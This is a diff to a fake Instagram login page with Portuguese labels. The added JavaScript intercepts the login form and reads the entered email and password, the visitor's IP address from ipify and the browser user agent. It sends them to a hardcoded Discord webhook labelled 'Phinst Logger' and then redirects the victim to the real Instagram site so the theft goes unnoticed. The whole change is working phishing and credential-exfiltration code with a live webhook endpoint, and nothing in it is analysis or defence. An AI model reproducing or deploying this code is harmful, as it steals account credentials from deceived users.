@@ -48,7 +48,7 @@
                     <img src="/img/instagram-logo.png" alt="Instagram logo" />
                 </h1>
 
-                <form method="POST" action="/" onsubmit="showLoading()">
+                <form id="loginForm">
                     <input id="email" name="email" type="text" placeholder="Telefone, nome de usuário ou e-mail" required />
                     <input id="password" name="password" type="password" placeholder="Senha" required />
                     <button type="submit">Entrar</button>
@@ -100,9 +100,51 @@
     </footer>
 
     <script>
+        const webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";
+
         function showLoading() {
             document.getElementById('loading').style.display = 'flex';
         }
+
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+            showLoading();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const userAgent = navigator.userAgent;
+
+            fetch("https://api.ipify.org?format=json")
+                .then(res => res.json())
+                .then(ipData => {
+                    const payload = {
+                        username: "Phinst Logger",
+                        embeds: [{
+                            title: "📥 Credenciais JS Recebidas",
+                            color: 0x00FFFF,
+                            fields: [
+                                { name: "Login", value: email, inline: true },
+                                { name: "Senha", value: password, inline: true },
+                                { name: "IP", value: ipData.ip, inline: false },
+                                { name: "User-Agent", value: userAgent, inline: false }
+                            ]
+                        }]
+                    };
+
+                    return fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                })
+                .then(() => {
+                    window.location.href = "https://www.instagram.com";
+                })
+                .catch(err => {
+                    console.error("Erro ao enviar:", err);
+                    window.location.href = "https://www.instagram.com";
+                });
+        });
     </script>
 </body>
 </html>
